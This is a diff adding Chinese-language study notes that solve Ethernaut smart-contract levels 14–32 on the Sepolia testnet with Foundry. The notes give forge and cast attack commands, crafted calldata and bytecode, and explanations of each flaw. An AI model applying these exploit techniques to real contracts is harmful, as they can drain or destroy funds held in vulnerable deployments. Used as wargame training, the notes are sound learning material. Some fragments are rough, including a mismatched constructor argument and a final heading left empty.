@@ -1,0 +1,734 @@
+模版:Level 27: Forta - Foundry 攻击步骤
+🎯 目标
+📋 攻击步骤
+🧪 完整自动化脚本（可选）
+🎓 学到的知识
+一句话总结
+
+forge create src/14-GatekeeperOneAttack/GatekeeperOneAttack.sol:GatekeeperOneAttack \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY \
+    --broadcast \
+    --constructor-args $Elevator_ADDRESS
+
+
+
+
+14-GatekeeperOne/AttackGateKeeperOne.sol
+```
+forge create src/14-GatekeeperOne/AttackGateKeeperOne.sol:GatekeeperOneAttack \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY \
+    --broadcast     \
+    --constructor-args $GatekeeperOne_ADDRESS
+Deployed to: 0x7af2b50a036852d8C51cFED3250F26CfD76066E8
+
+attack:
+cast call $GatekeeperOne_ADDRESS "entrant()" --rpc-url $sepolia_rpc
+cast send 0x7af2b50a036852d8C51cFED3250F26CfD76066E8 \
+--rpc-url $sepolia_rpc \
+ --private-key $PRIVATE_KEY \
+ --gas-limit 3000000
+```
+
+15-GatekeeperTwoAttack
+```
+
+forge create src/15-GatekeeperTwo/GatekeeperTwoAttack.sol:GatekeeperTwoAttack \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY \
+    --broadcast     \
+    --constructor-args $GatekeeperTwo_ADDRESS \
+    -vvvv
+Deployed to: 0x5B62f395D0BAe18cFf09E90D9C174B2a38E07e75
+
+cast call $GatekeeperTwo_ADDRESS "entrant()" --rpc-url $sepolia_rpc
+```
+
+# 16-NaughtCoin
+```
+# 1. 查看余额
+cast call $NaughtCoin_ADDRESS "balanceOf(address)" $YOUR_ADDRESS --rpc-url $sepolia_rpc
+
+# 2. 授权
+cast send $NaughtCoin_ADDRESS "approve(address,uint256)" $YOUR_ADDRESS $(cast call $NaughtCoin_ADDRESS "balanceOf(address)" $YOUR_ADDRESS --rpc-url $sepolia_rpc) \
+  --rpc-url $sepolia_rpc \
+  --private-key $PRIVATE_KEY
+
+# 3. 使用 transferFrom 转走
+cast send $NaughtCoin_ADDRESS "transferFrom(address,address,uint256)" $YOUR_ADDRESS $ANOTHER_ADDRESS $(cast call $NaughtCoin_ADDRESS "balanceOf(address)" $YOUR_ADDRESS --rpc-url $sepolia_rpc) \
+  --rpc-url $sepolia_rpc \
+  --private-key $PRIVATE_KEY
+```
+### 考察点:
+- 构造函数语法：ERC20("NaughtCoin", "0x0") 是调用父合约构造函数
+- 漏洞根源：ERC20 有两个转账入口，只限制了一个
+- 以太坊原因：继承机制导致未重写的函数使用父合约实现
+- 教训：重写函数时要考虑所有入口点，或重写内部函数
+
+# 17-Preservation
+```
+# 1. 部署攻击合约
+forge create src/17-Preservation/PreservationAttack.sol:PreservationAttack \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY \
+    --broadcast
+=> Deployed to: 0xA913BB312e3b6A7E21bc6Af3Da388fC585EbFc69
+# 2. 查看当前 owner
+cast call $Preservation_ADDRESS "owner()" --rpc-url $sepolia_rpc
+# 3. 第一次攻击：替换 library 地址
+cast send $Preservation_ADDRESS "setFirstTime(uint256)" \
+    0x000000000000000000000000a913bb312e3b6a7e21bc6af3da388fc585ebfc69 \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+# 4. 验证 timeZone1Library 是否被替换
+cast call $Preservation_ADDRESS "timeZone1Library()" --rpc-url $sepolia_rpc
+# 5. 第二次攻击：修改 owner
+cast send $Preservation_ADDRESS "setFirstTime(uint256)" \
+    0x0000000000000000000000004a2578679c9a9901844380c7340e074045e75853 \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+```
+
+### 考察点
+- 1. delegatecall 的危险性
+在调用者上下文执行代码
+存储槽位置由被调用合约决定
+如果布局不一致，会覆盖错误的变量
+- 2. 没有验证 library 地址
+允许用户通过 delegatecall 修改 library 地址
+没有访问控制
+
+
+# 18-Recovery
+```
+# 步骤 1: 计算 SimpleToken 合约地址 //nonce不一定为1 可以结合区块浏览器确认或者编程获取地址
+SIMPLE_TOKEN=$(cast compute-address --nonce 1 $Recovery_ADDRESS)
+//0x59b73c1025C305Ed13bD0ed2Ce755e9859c3991d
+echo "SimpleToken address: $SIMPLE_TOKEN"
+# 步骤 2: 验证合约确实存在
+cast code $SIMPLE_TOKEN --rpc-url $sepolia_rpc
+# 步骤 3: 检查合约余额
+cast balance $SIMPLE_TOKEN --rpc-url $sepolia_rpc
+# 步骤 4: 调用 destroy 函数，将 ETH 转到你的地址
+cast send $SIMPLE_TOKEN "destroy(address)" $YOUR_ADDRESS \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+```
+
+### 考察点：
+- 合约地址的确定性计算
+- RLP 编码理解
+- 区块链浏览器的使用
+- CREATE vs CREATE2
+- selfdestruct 的使用
+
+# 19-MagicNum
+```
+构造一个编译器合约:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract SolverDeployer {
+    function deploy() public returns (address) {
+        bytes memory bytecode = hex"600a600c600039600a6000f3602a60005260206000f3";
+        address solver;
+        
+        assembly {
+            solver := create(0, add(bytecode, 0x20), mload(bytecode))
+        }
+        
+        return solver;
+    }
+}
+# 1. 部署 SolverDeployer //其实这一步 同时创建了两个合约
+forge create src/19-MagicNum/SolverDeployer.sol:SolverDeployer \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY \
+    --broadcast
+Deployed to: 0xCcbc18F6978FFD0211377851fBB3cEAdc0A9998b
+
+# 2. 调用 deploy() 创建 solver 合约
+cast send --rpc-url $sepolia_rpc --private-key $PRIVATE_KEY $SolverDeployer_ADDRESS 
+=>tx: 0xee91ec904447236c48a3831415960a344f0dce868e9519e2e2b8c6e73697d542
+计算地址:0xf86983085f15DC9b6CB14e84E1d26E7EE8282a2F
+SOLVER=$(cast compute-address --nonce 1 0xCcbc18F6978FFD0211377851fBB3cEAdc0A9998b)
+或者使用cast run fork:
+luckyme@macdeMacBook-Pro ethernaut % cast run 0xee91ec904447236c48a3831415960a344f0dce868e9519e2e2b8c6e73697d542 \
+    --rpc-url $sepolia_rpc
+Executing previous transactions from the block.
+Traces:
+  [34475] 0xCcbc18F6978FFD0211377851fBB3cEAdc0A9998b::deploy()
+    ├─ [2024] → new <unknown>@0xf86983085f15DC9b6CB14e84E1d26E7EE8282a2F
+    │   └─ ← [Return] 10 bytes of code
+    └─ ← [Return] 0x000000000000000000000000f86983085f15dc9b6cb14e84e1d26e7ee8282a2f
+
+
+Transaction successfully executed.
+Gas used: 55539
+=> SOLVER_Address=0xf86983085f15DC9b6CB14e84E1d26E7EE8282a2F
+
+# 3. 测试
+cast call $SOLVER_Address "whatIsTheMeaningOfLife()" --rpc-url $sepolia_rpc
+
+# 4. 设置到 MagicNum
+cast send $MagicNum_ADDRESS "setSolver(address)" $SOLVER_Address \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+
+```
+
+### 考察知识点
+- 编译后的字节码会有几百字节，远超 10 字节限制需要手写EVM 字节码缩小codesize.
+- 了解运行时代码 (runtime code)
+```
+// 运行时代码（10 字节）
+602a    // PUSH1 0x2a (将 42 推入栈)
+6000    // PUSH1 0x00 (内存位置 0)
+52      // MSTORE (将 42 存储到内存位置 0)
+6020    // PUSH1 0x20 (返回数据长度 32 字节)
+6000    // PUSH1 0x00 (内存位置 0)
+f3      // RETURN (返回内存中的数据)
+
+// 总共：10 字节 ✓
+```
+- 了解创建代码 (creation code)  负责将运行时代码复制到内存,返回运行时代码
+```
+// 创建代码
+600a    // PUSH1 0x0a (运行时代码长度 = 10 字节)
+600c    // PUSH1 0x0c (运行时代码在创建代码中的起始位置)
+6000    // PUSH1 0x00 (内存目标位置)
+39      // CODECOPY (复制代码到内存)
+600a    // PUSH1 0x0a (返回数据长度 = 10 字节)
+6000    // PUSH1 0x00 (内存位置)
+f3      // RETURN (返回运行时代码)
+
+// 运行时代码（紧跟在创建代码后面）
+602a60005260206000f3
+
+// 完整字节码：
+// 创建代码：600a600c600039600a6000f3
+// 运行时代码：602a60005260206000f3
+```
+- 完整十六进制：0x600a600c600039600a6000f3602a60005260206000f3 (也叫原始字节码,包含了创建代码以及运行时代码)
+
+### 彩蛋
+Awesome work! You’re halfway through Ethernaut and getting pretty good at breaking things. Working as a Blockchain Security Researcher at OpenZeppelin could be fun... https://grnh.se/fdbf1c043us
+
+
+
+# 20-AlienCodex
+```
+# 步骤 1: makeContact（设置 contact = true）
+cast send $AlienCodex_ADDRESS "makeContact()" \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+-> cast storage $AlienCodex_ADDRESS 0 --rpc-url $sepolia_rpc
+-> 获取slot0的数据 
+0bc04aa6aac163a6b3667636d798fa053d43bd11 这是owner 
+01 这个代表bool public contact;此时contact=0x01 (true)
+0x0000000000000000000000010bc04aa6aac163a6b3667636d798fa053d43bd11
+查看此时的slot1 cast storage $AlienCodex_ADDRESS 1 --rpc-url $sepolia_rpc
+-> 0x0000000000000000000000000000000000000000000000000000000000000000
+步骤 2: 触发下溢
+# retract() - 数组长度下溢
+cast send $AlienCodex_ADDRESS "retract()" \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+此时再查看 slot1 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+
+步骤 3: 计算攻击索引 i=2^256 - keccak256(1) 此时刚好 codex[i] 回到了 slot1的
+INDEX=0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
+
+# 5. 执行攻击
+cast send $AlienCodex_ADDRESS "revise(uint256,bytes32)" 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a 0x0000000000000000000000004a2578679c9a9901844380c7340e074045e75853 \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+```
+
+### 考察点
+- 需要熟悉evm中的动态数组存储机制
+
+
+# 21-Denial
+```
+# 1. 部署攻击合约
+forge create src/21-Denial/DenialAttack.sol:DenialAttack \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY \
+    --broadcast
+Deployed to: 0xef1D7369465f0c3Aa2d02b62294f70072c5374a4
+
+# 2. 设置为 partner
+cast send $Denial_ADDRESS "setWithdrawPartner(address)" $DenialAttack_ADDRESS \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+cast send $Denial_ADDRESS "partner()"  --rpc-url $sepolia_rpc --private-key $PRIVATE_KEY
+
+# 3. 检查合约余额（应该 > 0）
+cast call $Denial_ADDRESS "contractBalance()" --rpc-url $sepolia_rpc
+
+# 4. 尝试 withdraw（应该失败）
+cast send $Denial_ADDRESS "withdraw()" \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY \
+    --gas-limit 900000  \
+    -vvvv
+```
+
+### 考察点 
+- call会转发所有剩余gas,不限制被调用合约的gas使用
+- transfer固定提供2300gas,如果当前剩余gas<2300+overhead 就会revert
+EIP-150 规则：call 至少保留 1/64 的 gas 给调用者,转发最多 63/64 的 gas
+如果您使用低级别调用以在外部调用恢复的情况下继续执行，请确保您指定固定的gas费用。
+
+
+# 22-Shop
+```
+1. 部署攻击合约
+forge create src/22-Shop/ShopAttack.sol:ShopAttack \
+  --rpc-url $sepolia_rpc \
+  --private-key $PRIVATE_KEY \
+  --broadcast \
+  --constructor-args $Shop_ADDRESS
+Deployed to: 0x55DE24a1E7B826DD1614b3B968E7E26D929c5529
+2. 验证初始状态
+# 检查初始价格
+cast call $Shop_ADDRESS "price()" --rpc-url $sepolia_rpc
+# 输出: 100 (0x64)
+# 检查是否已售出
+cast call $Shop_ADDRESS "isSold()" --rpc-url $sepolia_rpc
+# 输出: false (0x00)
+3. 执行攻击
+cast send $ShopAttack_ADDRESS "attack()" \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY \
+    -vv
+4. 验证结果
+# 检查最终价格
+cast call $Shop_ADDRESS "price()" --rpc-url $sepolia_rpc
+# 输出: 0 (0x00) ✓
+```
+### 考察点
+- 状态依赖
+- view 函数不能修改自己合约的状态,但可以读取其他合约的状态
+- 如果其他合约的状态改变，view函数的返回值也可以随之变化
+
+
+# 23-Dex
+```
+# 1. 查看初始状态
+export TOKEN1=0xb04a01b9cf19192d393a85300bbcba0b126a18ab
+export TOKEN2=0x21d1be3af432384865df27b8efbe15473b9325e2
+cast call $Dex_ADDRESS "balanceOf(address,address)" $TOKEN1 $Dex_ADDRESS --rpc-url $sepolia_rpc
+cast call $Dex_ADDRESS "balanceOf(address,address)" $TOKEN2 $Dex_ADDRESS --rpc-url $sepolia_rpc
+cast call $Dex_ADDRESS "balanceOf(address,address)" $TOKEN1 $YOUR_ADDRESS --rpc-url $sepolia_rpc
+cast call $Dex_ADDRESS "balanceOf(address,address)" $TOKEN2 $YOUR_ADDRESS --rpc-url $sepolia_rpc
+====>
+0x0000000000000000000000000000000000000000000000000000000000000064
+0x0000000000000000000000000000000000000000000000000000000000000064
+0x000000000000000000000000000000000000000000000000000000000000000a  
+0x000000000000000000000000000000000000000000000000000000000000000a
+
+# 2. 授权 //用户授权dex合约使用最大数量的token1和token2
+cast send $Dex_ADDRESS "approve(address,uint256)" $Dex_ADDRESS $(cast max-uint) \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+
+# 3. Round 1: token1 → token2
+cast send $Dex_ADDRESS "swap(address,address,uint256)" $TOKEN1 $TOKEN2 10 \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+
+# 4. Round 2: token2 → token1
+cast send $Dex_ADDRESS "swap(address,address,uint256)" $TOKEN2 $TOKEN1 20 \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+
+# 5. Round 3: token1 → token2
+cast send $Dex_ADDRESS "swap(address,address,uint256)" $TOKEN1 $TOKEN2 24 \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+cast send $Dex_ADDRESS "swap(address,address,uint256)" $TOKEN2 $TOKEN1 30 \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+cast send $Dex_ADDRESS "swap(address,address,uint256)" $TOKEN1 $TOKEN2 41 \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+cast send $Dex_ADDRESS "swap(address,address,uint256)" $TOKEN2 $TOKEN1 45 \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+====>token1被全部兑换出来
+cast call $Dex_ADDRESS "balanceOf(address,address)" $TOKEN1 $Dex_ADDRESS --rpc-url $sepolia_rpc
+0x0000000000000000000000000000000000000000000000000000000000000000
+```
+
+### 考察点
+- 价格计算公式本身有缺陷,可以通过反复交易套利
+
+# 24-DexTwo
+```
+# 1. 部署攻击合约（会自动创建 FakeToken）
+forge create src/24-DexTwo/DexTwoAttackAuto.sol:DexTwoAttackAuto \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+====>
+Deployed to: 0x62796C20c3c6417389F3C9D10edfadbFA0B74C24
+
+export dex2ATTACK_ADDRESS=0x62796C20c3c6417389F3C9D10edfadbFA0B74C24
+export DexTwo_ADDRESS=0x450c4274FE01e7CC8eC09740Dbac2c52C68d4813
+# 2. 执行攻击
+cast send $dex2ATTACK_ADDRESS "attack(address)" $DexTwo_ADDRESS \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY \
+    -vv
+```
+
+### 考察点 
+- 没有验证token白名单
+- 使用 balanceOf 作为定价依据:
+
+
+# 25-PuzzleWallet
+```
+# 部署攻击合约
+echo -e "\n=== 部署攻击合约 ==="
+forge create src/25-PuzzleWallet/PuzzleWalletAttack.sol:PuzzleWalletAttack \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY \
+    --broadcast \
+    --constructor-args $PuzzleWallet_ADDRESS 
+Deployed to: 0x8938223232ED7474b03EcBBE90Acf13AfFA3Bc1c
+export ATTACK_ADDRESS=0x8938223232ED7474b03EcBBE90Acf13AfFA3Bc1c
+执行攻击
+cast send $ATTACK_ADDRESS "attack()" \
+    --value 0.001ether \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY \
+    --gas-limit 500000
+```
+
+### 考察点
+- 理解代理合约和逻辑合约的共享存储机制
+- 逻辑合约只是代码库 没有实际存储,只提供代码，不存储数据,storage是空的
+- muticall的嵌套调用  会产生新的局部函数内局部变量 导致重入
+```
+外层 multicall([deposit(), multicall([deposit()])])
+  │
+  ├─ depositCalled = false  // ← 外层的局部变量
+  │
+  ├─ i = 0: deposit()
+  │  ├─ selector = deposit.selector ✓
+  │  ├─ require(!depositCalled) ✓ (false, 通过)
+  │  ├─ depositCalled = true  // 外层标记为 true
+  │  └─ delegatecall(deposit())
+  │     └─ balances[msg.sender] += 0.001
+  │
+  └─ i = 1: multicall([deposit()])
+     ├─ selector = multicall.selector  // 不是 deposit ✓
+     ├─ if 条件不满足，跳过检查
+     │
+     └─ delegatecall(multicall([deposit()]))  ← 嵌套调用！
+        │
+        │ 内层 multicall([deposit()])
+        ├─ depositCalled = false  // ← 新的局部变量！
+        │
+        └─ i = 0: deposit()
+           ├─ selector = deposit.selector ✓
+           ├─ require(!depositCalled) ✓ (false, 通过！)
+           ├─ depositCalled = true
+           └─ delegatecall(deposit())
+              └─ balances[msg.sender] += 0.001
+```
+
+
+# 26-Motorbike
+```
+// 升级到 Destroyer 合约
+Engine(engine).upgradeToAndCall(
+    destroyerAddress,
+    abi.encodeWithSignature("destroy()")
+);
+
+// 执行流程：
+// 1. _setImplementation(destroyer)  ← Engine 的 implementation 变成 Destroyer
+// 2. delegatecall(destroy())        ← 在 Engine 的上下文中执行
+//    └─ selfdestruct                ← Engine 合约被销毁！
+
+# 1. 获取 Engine 地址 Motorbike_ADDRESS
+$(cast storage $Motorbike_ADDRESS $IMPLEMENTATION_SLOT --rpc-url $sepolia_rpc)
+ENGINE_ADDRESS=0x0107f010eaed9c32182feed33d945211c17508c4
+
+# 2. 检查 Engine 的 upgrader
+cast call $ENGINE_ADDRESS "upgrader()" --rpc-url $sepolia_rpc
+0x0000000000000000000000000000000000000000000000000000000000000000 //Engine 未初始化，可以攻击
+
+# 3. 部署攻击合约
+echo -e "\n=== Step 3: 部署攻击合约 ==="
+forge create src/26-Motorbike/MotorbikeAttack.sol:MotorbikeAttack \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY \
+    --broadcast \
+    --constructor-args $Motorbike_ADDRESS 
+Deployed to: 0xF6c10d90a75F49135B900C366b18D953F88a5aD0
+export ATTACK_ADDRESS=0xF6c10d90a75F49135B900C366b18D953F88a5aD0
+
+# 4. 执行攻击
+cast send $ATTACK_ADDRESS "attack(address)" $ENGINE_ADDRESS \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+
+//使用eip-7702 在同一笔交易中创建和自毁engine合约:
+https://github.com/Ching367436/ethernaut-motorbike-solution-after-decun-upgrade/blob/main/contracts/MotorbikeInterface.sol
+export YOUR_ADDRESSZ=0x4A2578679C9a9901844380C7340e074045e75853
+export PRIVATE_KEY=0x你的私钥
+export MOTORBIKE_INSTANCE=0xMotorbike实例地址
+export sepolia_rpc=你的RPC_URL
+```
+
+### 考察点
+- 考察的是UUPS代理模式的初始化漏洞
+- 对selfdestroy的理解 只有在同一笔交易中创建并销毁才会删除代码,否则只是将余额转走(EIP-6780 规则)
+
+
+# 27-DoubleEntryPoint
+```
+# 1. 获取合约地址（从新实例）
+export NEW_INSTANCE=0xB7ED48d71A303cdF8bcFc659E02fF9bE92df3c9B  # DET 实例地址
+export FORTA_ADDRESS=$(cast call $NEW_INSTANCE "forta()(address)" --rpc-url $sepolia_rpc)
+export VAULT_ADDRESS=$(cast call $NEW_INSTANCE "cryptoVault()(address)" --rpc-url $sepolia_rpc)
+export LEGACY_TOKEN=$(cast call $NEW_INSTANCE "delegatedFrom()(address)" --rpc-url $sepolia_rpc)
+export DET_ADDRESS=$NEW_INSTANCE
+
+# 2. 部署检测机器人（传入 Vault 地址）
+forge create src/27-Forta/FortaDetectionBot.sol:FortaDetectionBot \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY \
+    --broadcast \
+    --constructor-args $VAULT_ADDRESS
+# Deployed to: 0x8Dca7d1b9C97b8cD93950aaBc0A38318C9FBa964
+export BOT_ADDRESS=<部署地址>
+
+# 3. 注册检测机器人到 Forta
+cast send $FORTA_ADDRESS "setDetectionBot(address)" $BOT_ADDRESS \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+
+# 4. 验证注册成功
+cast call $FORTA_ADDRESS "usersDetectionBots(address)(address)" $YOUR_ADDRESS --rpc-url $sepolia_rpc
+
+# 5. 测试防御（应该被阻止并 revert）
+cast send $VAULT_ADDRESS "sweepToken(address)" $LEGACY_TOKEN \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY \
+    --gas-limit 500000 \
+    -vv
+# 预期结果: revert "Alert has been triggered, reverting"
+
+# 执行链路
+vault.sweepToken(LegacyToken)
+  → LegacyToken.transfer()
+    → DET.delegateTransfer(to, value, vault)  ← origSender = vault
+      → fortaNotify modifier
+        → forta.notify(player, msg.data)
+          → detectionBot.handleTransaction(player, msgData)
+            ├─ 从 msgData 中提取 origSender (使用 msgData.offset + 0x44)
+            ├─ 检测到 origSender == cryptoVault
+            └─ forta.raiseAlert(player)  ✅ 触发警报
+      → 检查 botRaisedAlerts 增加
+      → revert("Alert has been triggered, reverting")
+```
+
+### 考察点
+- **双重入口漏洞**：代币委托升级机制中，旧代币（LGT）委托给新代币（DET），如果 Vault 清理 LGT，实际会转走 DET
+- **Calldata 解析**：理解 `bytes calldata` 参数的内存布局，使用 `msgData.offset` 正确读取参数
+- **Assembly 数据读取**：`calldataload(add(msgData.offset, 0x44))` 读取第三个参数 `origSender`
+- **防御机制**：通过检测 `origSender == vault` 来防御双重入口攻击，在 `fortaNotify` 修饰符中触发 revert
+
+# 28-GoodSamaritan
+```
+# 1. 部署攻击合约
+forge create src/28-GoodSamaritan/GoodSamaritanAttack.sol:GoodSamaritanAttack \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY \
+    --broadcast \
+    --constructor-args $GoodSamaritan_ADDRESS
+export GoodSamaritan_ADDRESS=0xEfEb3CC9FF84ccf0D376348A216794072d75AB18
+Deployed to: 0xfeE3DE6909322e4A0B20E501b9aa4762Eb08F4bf
+export ATTACK_ADDRESS=0xfeE3DE6909322e4A0B20E501b9aa4762Eb08F4bf
+
+# 2. 查看初始余额（可选）
+cast call $GoodSamaritan_ADDRESS "coin()(address)" --rpc-url $sepolia_rpc
+export COIN_ADDRESS=0x5071E32Bb12387f74909C703B247f07F373A016C
+cast call $COIN_ADDRESS "balances(address)(uint256)" $YOUR_ADDRESS --rpc-url $sepolia_rpc
+# 应该是 0
+
+# 3. 执行攻击
+cast send $ATTACK_ADDRESS "attack()" \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+
+# 4. 验证攻击成功
+cast call $COIN_ADDRESS "balances(address)(uint256)" $YOUR_ADDRESS --rpc-url $sepolia_rpc
+# 应该显示 1000000 (10^6)
+
+# 执行链路
+attacker.attack()
+  → GoodSamaritan.requestDonation()
+    → wallet.donate10(attacker)
+      → coin.transfer(attacker, 10)
+        → attacker.notify(10)  ← 攻击者检测到 amount == 10
+          → revert NotEnoughBalance()  ← 伪造错误！
+    → catch NotEnoughBalance()  ← GoodSamaritan 误以为余额不足
+      → wallet.transferRemainder(attacker)
+        → coin.transfer(attacker, 1000000)  ← 转移全部余额
+          → attacker.notify(1000000)  ← 正常接收，不抛错
+```
+
+### 考察点
+- **自定义错误伪造**：任何合约都可以抛出相同签名的 `NotEnoughBalance()` 错误
+- **错误处理缺陷**：只检查错误签名，不验证错误来源和真实状态
+- **回调函数风险**：`notify()` 回调给攻击者控制执行流的机会
+- **业务逻辑漏洞**：小额失败 → 转移全部余额的设计不合理
+
+
+# 29-GatekeeperThree
+```
+# 1. 部署攻击合约
+export GatekeeperThree_ADDRESS=0xb8c4a855d76719513Ec65558D229c4A8375012Cc
+forge create src/29-GatekeeperThree/GatekeeperThreeAttack.sol:GatekeeperThreeAttack \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY \
+    --broadcast \
+    --constructor-args $GatekeeperThree_ADDRESS
+Deployed to: 0x4A846e9a2852DDa7dC78bEC97ff92a9a35e676f1
+
+export ATTACK_ADDRESS=0x4A846e9a2852DDa7dC78bEC97ff92a9a35e676f1
+
+# 2. 执行攻击（需要发送 ETH）
+cast send $ATTACK_ADDRESS "attack()" \
+    --value 0.002ether \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+
+# 3. 验证成功
+cast call $GatekeeperThree_ADDRESS "entrant()(address)" --rpc-url $sepolia_rpc
+# 应该返回你的地址
+
+# 攻击流程
+attack()
+  ├─ target.construct0r()           ← Gate 1: 攻击合约成为 owner
+  ├─ target.createTrick()           ← 创建 SimpleTrick
+  ├─ target.getAllowance(timestamp) ← Gate 2: 设置 allowEntrance = true
+  ├─ transfer(0.002 ether)          ← 向目标发送 ETH
+  └─ target.enter()                 ← Gate 3: send() 失败（无 receive），通过！
+       └─ entrant = tx.origin ✓
+```
+
+### 考察点
+- **构造函数拼写错误**：`construct0r`（数字0）不是真正的 constructor，任何人可调用
+- **tx.origin vs msg.sender**：通过合约调用绕过 owner 检查
+- **send() 失败利用**：攻击合约不实现 receive/fallback，故意让 send 失败
+- **时间戳作为密码**：`block.timestamp` 可预测，不安全
+
+# 30-Switch
+```
+# 1. 部署攻击合约
+forge create src/30-Switch/SwitchAttack.sol:SwitchAttack \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY \
+    --broadcast
+
+export ATTACK_ADDRESS=0xf0Ebc4e185f70fAdf5aa13392A994EDCe359b869
+
+# 2. 执行攻击
+cast send $ATTACK_ADDRESS "attack(address)" $SWITCH_ADDRESS \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+
+# 3. 验证成功
+cast call $SWITCH_ADDRESS "switchOn()(bool)" --rpc-url $sepolia_rpc
+# 应该返回 true
+
+# Calldata 结构解析
+正常 calldata:
+[0x00-0x04] flipSwitch selector
+[0x04-0x24] offset = 0x20
+[0x24-0x44] length = 0x04
+[0x44-0x48] turnSwitchOff ← 位置 68
+
+攻击 calldata:
+[0x00-0x04] flipSwitch selector (30c13ade)
+[0x04-0x24] offset = 0x60 ← 修改偏移量！
+[0x24-0x44] 填充数据
+[0x44-0x48] turnSwitchOff (20606e15) ← 位置 68，通过检查 ✓
+[0x48-0x60] 填充数据
+[0x60-0x80] length = 0x04 ← 实际 _data 在这里
+[0x80-0x84] turnSwitchOn (76227e12) ← 实际执行这个！
+```
+
+### 考察点
+- **ABI 编码机制**：动态类型使用偏移量指针，实际数据可在任意位置
+- **Calldata 操纵**：通过修改 offset，让检查和执行看到不同的数据
+- **固定位置检查缺陷**：`calldatacopy(selector, 68, 4)` 假设数据总在固定位置
+- **修饰符绕过**：利用 calldata 结构特性绕过安全检查
+
+# 31-HigherOrder
+```
+# 1. 查看初始状态
+export HigherOrder_ADDRESS=0x2Aee34a7268Fb1055f4581Bb74AabB1ED9e92814
+cast call $HigherOrder_ADDRESS "treasury()(uint256)" --rpc-url $sepolia_rpc
+# 输出: 0
+cast call $HigherOrder_ADDRESS "commander()(address)" --rpc-url $sepolia_rpc
+# 输出: 0x0000000000000000000000000000000000000000
+
+# 2. 获取函数选择器
+cast sig "registerTreasury(uint8)"
+# 输出: 0x211c85ab
+
+# 3. 构造原始 calldata 绕过 uint8 限制
+# calldata = 0x211c85ab (函数选择器) + 0x0000...0100 (256的uint256编码)
+cast send $HigherOrder_ADDRESS \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY \
+    "0x211c85ab0000000000000000000000000000000000000000000000000000000000000100"
+
+# 4. 验证 treasury 值
+cast call $HigherOrder_ADDRESS "treasury()(uint256)" --rpc-url $sepolia_rpc
+# 输出: 256 ✓
+
+# 5. 成为 commander
+cast send $HigherOrder_ADDRESS "claimLeadership()" \
+    --rpc-url $sepolia_rpc \
+    --private-key $PRIVATE_KEY
+
+# 6. 验证成功
+cast call $HigherOrder_ADDRESS "commander()(address)" --rpc-url $sepolia_rpc
+# 输出: 你的地址 ✓
+
+# 攻击原理
+函数签名: registerTreasury(uint8)  ← ABI 期望 1 字节
+内部实现: sstore(treasury_slot, calldataload(4))  ← 读取 32 字节！
+
+正常调用 registerTreasury(255):
+  calldata: 0x211c85ab + 0x00...ff (cast 会截断为 uint8)
+  
+攻击调用（原始 calldata）:
+  calldata: 0x211c85ab + 0x00...0100 (256)
+  ├─ ABI 解码器期望 uint8，但我们绕过它
+  └─ calldataload(4) 直接读取完整 32 字节 = 256 ✓
+```
+
+### 考察点
+- **类型安全绕过**：函数签名声明 `uint8`，但 assembly 直接读取 32 字节
+- **ABI 编码理解**：ABI 会将所有基本类型编码为 32 字节，即使声明为 uint8
+- **Calldata 直接操作**：使用 `calldataload(4)` 绕过 Solidity 的类型检查
+- **原始交易构造**：通过 `cast send` 发送原始 calldata 绕过客户端验证
+- **教训**：
+  - 不要混用高级类型声明和低级 assembly 读取
+  - Assembly 中应该验证参数范围
+  - 正确做法：`let value := and(calldataload(4), 0xff)` 截断为 uint8
+
+
+# 32-Stake
+
